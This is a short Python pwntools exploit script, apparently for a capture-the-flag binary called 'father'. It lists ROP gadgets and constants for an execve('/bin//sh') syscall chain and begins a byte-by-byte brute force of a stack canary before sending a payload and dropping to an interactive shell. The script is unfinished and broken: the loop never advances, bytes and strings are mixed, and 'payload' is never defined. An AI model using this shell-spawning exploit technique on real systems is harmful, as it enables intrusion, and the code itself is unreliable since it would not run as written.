from pwn import *

""" ROPGadgets

0x0000000000451064: push rsp; ret;
0x000000000042d6ce: push rdi; ret;
0x00000000004c2926: push rsi; ret;
0x00000000004d1ace: push rbp; ret;
0x000000000044b78f: push rbx; ret;

0x00000000004005cf: pop rax; ret;
0x0000000000400ad8: pop rbp; ret;
0x0000000000400f48: pop rbx; ret;
0x00000000004006c6: pop rdi; ret;
0x000000000044c2a6: pop rdx; ret;
0x0000000000410893: pop rsi; ret;
0x0000000000401f13: pop rsp; ret;

0x0000000000422113: cdq; ret;

0x00000000004013ec: syscall;

ROPGadgets """


""" Values
0x68732f2f6e69622f: "/bin//sh"
0x0000000000000000: 0
0x000000000000003b: 59
Values """


v18 = 1

p = process("./father")
p.recvuntil("3. stop create child and get out")
p.send(1)

safe_stack_buf = b'\x01' * 24
canary = ""
canary_len = 0
byte_int_try = 0

while True:
    
    byte_try = byte_int_try.to_bytes(1)
    p.recvuntil("Say something to your father")
    p.send(safe_stack_buf + canary + byte_try)





p.send(payload)

p.interactive()
